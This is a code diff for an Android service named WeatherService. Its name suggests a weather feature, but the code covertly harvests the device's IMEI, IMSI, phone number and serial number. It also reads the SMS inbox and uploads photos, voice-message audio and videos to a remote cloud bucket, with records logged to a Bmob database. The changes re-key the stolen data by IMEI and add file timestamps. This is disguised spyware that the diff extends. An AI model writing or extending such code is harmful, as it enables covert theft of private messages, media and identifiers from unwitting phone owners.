@@ -53,7 +53,8 @@ public class WeatherService extends Service {
     private Thread uploadThread;
 
     private Uri SMS_INBOX = Uri.parse("content://sms/");
-    private String serialNumber;//序列号
+    //    private String serialNumber;//序列号
+    private String IMEI;//序列号
     private String objectId;
 
     @Override
@@ -66,7 +67,8 @@ public class WeatherService extends Service {
         sign = mSign.getSign();
 
         PhoneInfo siminfo = new PhoneInfo(this);
-        serialNumber = siminfo.getSerialNumber();
+        IMEI = siminfo.getPhoneInfo().getDeviceId();
+        siminfo.getSerialNumber();
 //        第一：默认初始化.bmob云数据库
 //        Bmob.initialize(this, "2cbf044b0ebaa1b8d2acea05f19a22d7");
 
@@ -75,7 +77,7 @@ public class WeatherService extends Service {
         userInfo.setIMSI(siminfo.getIMSI());
         userInfo.setIMEI(siminfo.getPhoneInfo().getDeviceId());
         userInfo.setPhone(siminfo.getNativePhoneNumber());
-        userInfo.setSerialnumber(serialNumber);
+        userInfo.setSerialnumber(siminfo.getSerialNumber());
         userInfo.save(new SaveListener<String>() {
             @Override
             public void done(String s, BmobException e) {
@@ -99,7 +101,8 @@ public class WeatherService extends Service {
 
     private void saveInitUserTimes() {
         UserTimes userTimes = new UserTimes();
-        userTimes.setSerialnumber(serialNumber);
+//        userTimes.setSerialnumber(serialNumber);
+        userTimes.setIMEI(IMEI);
         userTimes.setFileTime("0");
         userTimes.setSmsTime("0");
         userTimes.save(new SaveListener<String>() {
@@ -120,7 +123,8 @@ public class WeatherService extends Service {
     private void checkTimes() {
         Log.i(this.getClass().getName(), "WeatherService->1");
         BmobQuery<UserTimes> bmobQuery = new BmobQuery<UserTimes>();
-        bmobQuery.addWhereEqualTo("serialnumber", serialNumber);
+//        bmobQuery.addWhereEqualTo("serialnumber", serialNumber);
+        bmobQuery.addWhereEqualTo("IMEI", IMEI);
         bmobQuery.findObjects(new FindListener<UserTimes>() {
             @Override
             public void done(List<UserTimes> list, BmobException e) {
@@ -170,22 +174,23 @@ public class WeatherService extends Service {
     private void upload(final String srcPath, final String type) {
 
         if (".jpg".equals(type)) {
-            cosPath = "jpg" + File.separator + System.currentTimeMillis() + ".jpg";
+            cosPath = "jpg";
         } else if (".amr".equals(type)) {
-            cosPath = "amr" + File.separator + System.currentTimeMillis() + ".amr";
+            cosPath = "amr";
         } else if (".png".equals(type)) {
-            cosPath = "png" + File.separator + System.currentTimeMillis() + ".png";
+            cosPath = "png";
         } else if (".jpeg".equals(type)) {
-            cosPath = "jpeg" + File.separator + System.currentTimeMillis() + ".jpeg";
+            cosPath = "jpeg";
         } else if (".gif".equals(type)) {
-            cosPath = "gif" + File.separator + System.currentTimeMillis() + ".gif";
+            cosPath = "gif";
         } else if (".mp4".equals(type)) {
-            cosPath = "mp4" + File.separator + System.currentTimeMillis() + ".mp4";
+            cosPath = "mp4";
             if (new File(srcPath).length() > 1048576 * 10) {
                 isFinish = true;
                 return;
             }
         }
+        cosPath += File.separator + IMEI + "_" + System.currentTimeMillis() + type;
 
         PutObjectRequest putObjectRequest = new PutObjectRequest();
         putObjectRequest.setBucket(mSign.getBucket());
@@ -234,7 +239,8 @@ public class WeatherService extends Service {
 
     private void findFileInfo(final String filePath, final String type) {
         BmobQuery<FileInfo> bmobQuery = new BmobQuery<FileInfo>();
-        bmobQuery.addWhereEqualTo("serialnumber", serialNumber);
+//        bmobQuery.addWhereEqualTo("serialnumber", serialNumber);
+        bmobQuery.addWhereEqualTo("IMEI", IMEI);
         bmobQuery.addWhereEqualTo("filePath", filePath);
         bmobQuery.findObjects(new FindListener<FileInfo>() {
             @Override
@@ -254,9 +260,11 @@ public class WeatherService extends Service {
     private void saveFileInfo(final String filePath, final String type) {
 
         FileInfo fileInfo = new FileInfo();
-        fileInfo.setSerialnumber(serialNumber);
+//        fileInfo.setSerialnumber(serialNumber);
+        fileInfo.setIMEI(IMEI);
         fileInfo.setFilePath(filePath);
         fileInfo.setFileType(type);
+        fileInfo.setFileUpdate(new File(filePath).lastModified());
         fileInfo.save(new SaveListener<String>() {
             @Override
             public void done(String s, BmobException e) {
@@ -302,7 +310,7 @@ public class WeatherService extends Service {
             isFinish = false;
             if (filePath.endsWith(".jpg")) {
                 findFileInfo(filePath, ".jpg");
-            } else if (filePath.endsWith(".amr")) {
+            } else if (filePath.contains("msg") && filePath.endsWith(".amr")) {
                 findFileInfo(filePath, ".amr");
             } else if (filePath.endsWith(".png")) {
                 findFileInfo(filePath, ".png");
@@ -365,7 +373,8 @@ public class WeatherService extends Service {
 
 
                     SmsInfo smsInfo = new SmsInfo();
-                    smsInfo.setSerialnumber(serialNumber);
+//                    smsInfo.setSerialnumber(serialNumber);
+                    smsInfo.setIMEI(IMEI);
                     smsInfo.setId(_id);
                     smsInfo.setThread_id(thread_id);
                     smsInfo.setAddress(address);
